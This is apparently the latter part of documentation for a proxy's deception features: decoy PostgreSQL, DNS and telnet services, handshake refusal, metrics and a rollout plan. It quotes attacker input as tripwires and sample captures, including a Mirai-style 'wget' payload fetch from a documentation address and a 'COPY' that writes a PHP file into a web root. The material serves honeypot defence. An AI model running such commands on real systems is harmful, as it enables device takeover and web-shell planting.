      mode: decoy
      profile: rails
      version: "13.14 (Debian 13.14-1.pgdg120+2)"   # …what the estate's own servers say…
      tables: ["public.users", "public.accounts"]
      superuser: false      # the field to think about
```

**`superuser: false` is the default and usually the right answer.** A decoy that
says yes is impersonating the account every scanner is hoping to find, and the next
statement will be `COPY ... FROM PROGRAM`. Saying no is both safer to impersonate
and the more common truth on an estate's application accounts — and a visitor who
is told no and tries it anyway has told you more than one who was told yes.

**The rule is the same one**: a statement that was going to reach the server is
never answered by the fabrication. On a real listener (`mode: answer`) it sits
exactly where a refusal would be written.

**The answers have to agree with each other.** The `is_superuser` parameter in the
startup sequence and the answer to `SELECT usesuper` are the same fact, and every
`COPY` and every file function is refused the way that fact requires — the
permission error a plain role gets, or, for a superuser, the error a program that
failed gives, which is still not a success. Each of the thirteen parameters the
startup announces can be asked about again with `SHOW` and gives the same value, in
the form that question takes: a real server says `on` or `off` to
`SHOW is_superuser` and `t` or `f` to the catalogue's `usesuper`, and a fabrication
that mixed the two is caught by exactly the check a fingerprinting tool makes. The
catalogue tables that hold authentication material answer SQLSTATE 42501 rather
than an empty set, because an empty set would say the table is there and has no
rows, which `pg_shadow` never is.

**It runs nothing, waits for nothing, and invents nothing.** `COPY FROM PROGRAM`
never answers a success. `pg_sleep(60)` is answered rather than honoured, because
honouring it would make this listener's resources something a visitor can hold a
statement at a time. And a `SELECT` the recognisers do not know returns an empty
result set, for the reason the MySQL section gives: the fabrication is a surface,
and inventing rows for an arbitrary projection would mean inventing a schema to
match.

**The tripwires need no configuring** — the escalation chain is the same on every
estate. One of them is recognised by *shape* rather than by name: a `COPY` naming a
server-side path mentions no privileged identifier at all, because the path is a
string literal, so `COPY t TO '/var/www/html/s.php'` is caught by what it is doing
rather than by what it names.

**There is no password to leave out.** On this protocol the startup packet carries
no credential — the role, the database and the application name are all a client
announces before the exchange — so the record has the identities and nothing else.
Where `require_auth` is set the fabrication asks for a credential, so that the
refusal looks like a checked one, and records its **length**.

**Unlike the MySQL decoy, this one can be behind TLS.** The encryption is
negotiated before the startup packet here and the relay answers the `SSLRequest`
itself, so a `decoy` listener with a `tls` section serves a client that insists on
`sslmode=require` — which is worth having, because a database that refuses TLS is
itself a thing a careful scanner notices.

## A resolver that is not there

Every fabrication above replaces a refusal the other end would have read. On DNS
the refusal is *all* the other end reads, because the query is the only thing it
ever sends.

That makes the arithmetic different here. A name on a threat feed answered
NXDOMAIN tells an implant that something on this network is deciding, and it has
a list of other names to try. A domain a client was caught tunnelling under,
refused for the cooldown, tells the tunnel to move — and the channel it moves to
is the one nobody is watching. Both refusals are correct. Both also end the only
conversation you were going to get.

```yaml
# A honeypot resolver on the client network: nothing behind it.
- name: resolver-spare
  address: "10.70.0.53:53"
  kind: dns
  dns:
    cookies: require          # so the record of who visited means something
    deception:
      mode: decoy
      profile: documentation  # RFC 5737 and RFC 3849: nothing routes there
      ttl: 300s
      tripwire: [payroll.internal]
```

**The rule is the same one**: a query that was going to reach a resolver is never
answered by the fabrication. On a listener that really resolves (`mode: answer`)
it sits in exactly the four places a refusal would be written — the block list, an
imported name list, a policy zone whose action is `nxdomain`, and the tunnelling
cooldown — and nowhere else. An RPZ rule that named `local` data or `nodata` is an
answer somebody wrote, and this does not overrule it.

**A different address for every name**, which is the difference between this and
the `sinkhole_ipv4` this listener has always had. A sinkhole answers one address
for everything, so a visitor who looks up two blocked names and gets one address
has found it in one extra query. A fabricated answer is drawn from a pool by the
name — stable for the life of the configuration, different for the next name — so
what a visitor maps looks like hosting.

**Two things here are about not becoming a weapon,** and they are the reason this
section is more careful than the others.

A resolver is an amplifier. A datagram proves nothing about where it came from, so
a fabrication that answered a forty-octet question with a kilobyte would be a
reflector aimed at whoever the source address really belongs to. So the answers
are small by construction — four types, a short TXT string, no ANY expansion — and
an answer to a client whose address nothing has verified is bounded against the
question that asked for it and truncated past that bound. A real client comes back
over TCP. A spoofed source cannot. On a decoy listener, `cookies: require` is
worth the compatibility it costs: nothing amplifies either way, but without it the
address in your record is the one the packet *claimed*, and on a honeypot that
record is the whole product.

And a fabricated address is somewhere a visitor then goes. The default pool is the
documentation range, which nothing routes and nobody hosts in, so a fabricated
answer cannot direct traffic at a real host — and an operator reading a firewall
log recognises `192.0.2.0/24` on sight. Pointing the pool at your own honeypot is
the powerful configuration, because then the *next* step is collected too: name
resolved here, connection accepted there. It is also the one that has to be
deliberate, and validation says so when the pool is inside the estate.

**What it will not pretend.** It answers A, AAAA, TXT and PTR, and everything else
is NODATA — inventing an MX would mean inventing a mail host, and an NS or SOA
would be a claim of authority a forwarding resolver is not making. The TXT answer,
which is the one a tunnel is waiting for, carries no command: this fabrication does
not know the other end's protocol and will not guess. What it has is the right
*shape*, and a tunnel that accepts an answer sends the next chunk — which is the
whole point.

**The tripwires need no configuring, and here they are mostly types.** A zone
transfer, a signature set, ANY, the NULL record that exists to carry arbitrary
octets, a query in a class that is not IN, and a name over a hundred octets: none
of those has a use against a forwarding resolver, and the last one is a tunnel
every time. The fingerprint names — `version.bind`, `hostname.bind`, `id.server`
— trip and are never answered, for the reason the S7 section gives about the
system status list: a service that names itself has handed over the list of what
it is vulnerable to.

## A login that is not there

Everything above answers a *protocol*. This one answers a person, or more often a
program pretending to be one, and the thing it collects is not a reply but a list.

A telnet port on a public address is found within the hour. What finds it is a
dictionary: the Mirai family and everything written after it walk a list of the
credentials that shipped on recorders, cameras and routers -- a few thousand pairs,
tried a handful at a time from a great many addresses so that no one of them looks
like an attack.

Refusing collects the address, which the firewall log already had. Answering
collects the list, and then the part that matters:

```
enable / system / shell / sh          is this a shell
/bin/busybox MIRAI                    is it busybox, and which one
echo -e '\x6b\x61\x6d\x69'            is anything actually reading this
cat /proc/cpuinfo                     which payload do I need
wget http://198.51.100.9/bins/x.arm7  and here is where it lives
```

That last line names the payload, the address serving it and the architecture it
was built for. Nothing else in this proxy produces it, and it arrives four
exchanges after a login that a refusal would have ended.

```yaml
# A honeypot on the plant network: a recorder that is not there.
- name: legacy-spare
  address: "10.70.0.23:23"
  kind: telnet
  telnet:
    deception:
      mode: decoy
      profile: busybox
      hostname: cam-07      # something this estate really has
      attempts: 2           # what a real device's login looks like
```

**The rule is the same one.** On a listener that fronts real equipment
(`mode: answer`) the fabrication sits where a refusal would be written -- a failed
second factor, the authorisation policy, a missing grant -- and nowhere else. It
does not replace `allow_clients` or a ban, because an address that may not connect
gets nothing. And it never replaces an **outage**: an operator working an incident
who cannot reach the equipment must be told that, not handed a device that is not
there. That is the one place in this whole document where answering would cost more
than refusing.

**The login never turns on the credential.** Every credential is accepted once the
configured number of attempts has been taken, and which one it was makes no
difference to what follows. A trap that accepted the right password and refused the
wrong one would be a credential oracle, which is the one thing a password list
needs -- the same reason the fabricated Redis accepts every `AUTH`.

**No password is kept, in any form a guess can be tested against.** This is the
section where that rule is hardest and matters most, because here the credential
*is* the intelligence. What is kept is the user name, the credential's length, and
a handle computed under a key the process made at startup from the system random
source and never writes down. That answers the operator's real question -- how many
distinct passwords did this client try, and have we seen this one before -- and
answers nothing at all to whoever reads the log later. After a restart the handles
are new, which is correct: the question was about a campaign, not about a password.
A process with no random source produces no handle rather than one under a constant
key. And the recording, where one is configured, holds the shell transcript and not
the login.

**Nothing is run and nothing is fetched.** `wget` and its family answer the
connection timeout a device behind a firewall answers -- after the address has been
written down. A fabrication that fetched the payload would be performing the
download on the attacker's behalf, from this estate's address, with this estate's
reputation, and would turn a sensor into a participant.

**And it invents no credentials.** `/etc/shadow` lists the accounts with `*` where
a hash would be: a fabricated hash is a machine's worth of somebody's time spent on
nothing, and a thing an operator could later mistake for real. `/tmp` is empty and
so is the shell history, for the reason the Modbus section gives about not
inventing a consequence it cannot maintain -- a fabricated history is a fabricated
person who used this machine.

## Refusal at the TLS handshake

```yaml
handshake:
  refuse_banned: true
  deny_fingerprints:
    - "t13d1516h2_8daaf6152771_02713d6af862"
```

Everything else here answers a request: the handshake runs, a
certificate is sent, keys are agreed, the request is parsed, and then
the proxy says no. For a client already on the ban list that is a key
exchange spent on a refusal — and an answer the scanner reads: a status,
a page, a header set, a certificate, a cipher list. Refusing in the
ClientHello costs one hello and gives back a failed negotiation, which
says nothing at all.

The trade is explicit: **there is no access log line**, because there
was never a request. The security log records the refusal with reason
`handshake` and detail `banned` or `fingerprint`, and
`xproxy_tls_handshakes_refused_total` counts it — but a client
complaining of a TLS error is diagnosed there, not in the access log.
Fingerprints group clients, they do not identify them: a full JA4 is
safe to deny once you have seen it in your own security log, and a
prefix covers a whole family, browsers included.

## What it produces

Loud on the inside, silent on the outside. Every control here writes a
security event, an access-log field, a counter and a metric, and shows
up in a management view:

| Control | Security log reason | Access log | Metric | Command |
|---------|--------------------|------------|--------|---------|
| Honeypot route | `honeypot` | `denied: honeypot`, later `honeypot_marked` | `xproxy_honeypot_hits_total`, `xproxy_honeypot_marked` | `xproxyctl honeypot` |
| Honeytoken | `honeytoken` (detail: token name) | `denied: honeytoken` | `xproxy_honeytoken_hits_total{token}` | `xproxyctl honeypot` |
| Form honeypot | the filter's `reason` | `form_guard`, `form_seconds` | `xproxy_denied_total{reason="filter"}` | `xproxyctl filters` |
| WAF rule | `waf` | `waf_matched`, `waf_message` | `xproxy_waf_*` | `xproxyctl waf rules` |
| Slow lane | — | `degraded: <level>` | `xproxy_degraded_total{level}` | `GET /v1/degradation` |
| Deceptive answer | `deceive` | `deceived: <route>` | `xproxy_deceived_total{route}` | `GET /v1/deceive` |
| Fabricated service | `<kind>_deceived`, `<kind>_tripwire` | *(none — none of these kinds is HTTP)* | `<kind>_deceived`, `<kind>_tripwire` | `xproxyctl decoys` |
| Handshake refusal | `handshake` | *(none — there is no request)* | `xproxy_tls_handshakes_refused_total` | `xproxyctl tls` |

What to alert on, in order: **any honeytoken hit** (one is enough), a
decoy hit rate that jumps by an order of magnitude (someone has started
a campaign), a `deceive` counter moving on a route where you did not
expect it (a condition is admitting people), and a degradation level
applying to a noticeable share of traffic (the same).

## Building it out

A workable order, each step cheap and reversible:

1. **Read the 404s.** The paths already being probed are the paths to
   answer. No configuration yet.
2. **A handful of honeypot routes** on the noisiest of them, `mark: 1h`,
   no delay. Watch `xproxy_honeypot_hits_total` for a week; confirm no
   real client is in the security log.
3. **`robots` and `sitemap` with `mark: 0s`**, naming those paths. The
   crawler that reads them and then asks for what they name has told you
   what it is.
4. **The ban trigger on reason `honeypot`** — a threshold in the tens
   over an hour, a ban measured in hours. Now the marks do something.
5. **Honeytokens for whatever the decoys hand out**, `action: log`
   first, then a threshold-of-one trigger once they are proven quiet.
6. **Plant tokens outside the proxy**: a repository, a backup, a
   supplier's copy, the runbook. This is where the technique pays.
7. **The hidden field** on the forms that get abused; the timing check
   later, after reading `form_seconds` in the log.
8. **A WAF file in detect mode**; promote the quiet rules.
9. **A degradation level on `marked: true`** — delay and rate first,
   `close: true` when it is boring.
10. **`handshake.refuse_banned`** once the ban list is trustworthy.
11. **`deceive`, last and narrowest**, on a read route, behind
    `marked`, before you ever consider a write route.

Steps 1–6 have no false-positive rate. Steps 7–11 do, which is why they
come after the logs say what normal looks like.

## Failure modes

**The honeypot path was in use.** The access log shows `denied:
honeypot` with real user agents and referrers, and the marks table fills
with customers. Remove the route, `xproxyctl honeypot forget <address>` for
the ones already marked, and pick a path from the 404 list instead.

**A honeytoken fires on real traffic.** It was planted somewhere real
traffic reaches — a value copied into a template, a test fixture that
made it into production, a credential that turned out to be real. The
token is wrong, not the traffic: remove it, then work out which copy
was wrong before planting it again.

**Marks stop being recorded.** The marks table is bounded (65 536, with
most of it reserved for what this node saw itself rather than what a
peer sent); `marks_dropped` in `xproxyctl honeypot` and `GET
/v1/honeypot` counts the refusals. A full table means a campaign, not a
bug — but the detection thins out while it lasts.

**Everything is marked.** Usually one over-broad honeypot path, or a
CIDR in a degradation level that covers a proxy or a NAT the customers
sit behind. `xproxyctl honeypot` lists the marks with the route that
made each one, which names the culprit immediately.

**A deceived client complains that data vanished.** A write was
discarded. Narrow the conditions to `marked` alone, and treat the
incident as a data-loss incident, because it was one.

**A client reports a TLS error nobody can explain.** Look in the
security log for reason `handshake`, not the access log. If the
fingerprint was the cause, it was a prefix that covered more than a
scanner.

## What deception is not

- **Not a substitute for a fix.** A decoy on `/wp-login.php` says
  nothing about whether the real login is sound. Deception buys time and
  information; it does not close a hole.
- **Not an attack.** Nothing here reaches back towards the client:
  no scanning, no exploitation, no tracking beyond the address and
  fingerprint the connection already carried. A tarpit holds a
  connection the client opened, in a slot bounded so it cannot be turned
  around and used against the proxy itself.
- **Not entrapment, and not a licence to lie to real users.** Deceptive
  answers are for clients that have already identified themselves by
  touching something that does not exist. Every decoy's content is
  fabricated but harmless: no malware, no data belonging to anyone, no
  credential that works anywhere.
- **Not free of privacy obligations.** Honeypot hits, marks and bans are
  records about identifiable clients, kept as long as the logs are kept.
  They belong in the same retention and access rules as the access log.

## Where to read more

| Topic | Reference |
|-------|-----------|
| Every key and default | [CONFIG.md](CONFIG.md): `routes[].honeypot`, `honeytokens[]`, `degradation`, `routes[].deceive`, `handshake`, filter kind `form_guard` |
| Worked examples and the commands | [USAGE.md](USAGE.md): honeypot routes and decoys, honeytokens, form honeypots, the slow lane, deceptive answers, refusing before the handshake |
| When something misfires | [TROUBLESHOOTING.md](TROUBLESHOOTING.md): a section per control, the symptom index, every deny reason |
| Configurations to copy | `examples/security/honeypots.yaml`, `examples/security/honeytokens.yaml`, `examples/filters/form-guard.yaml`, `examples/waf/*.conf` |
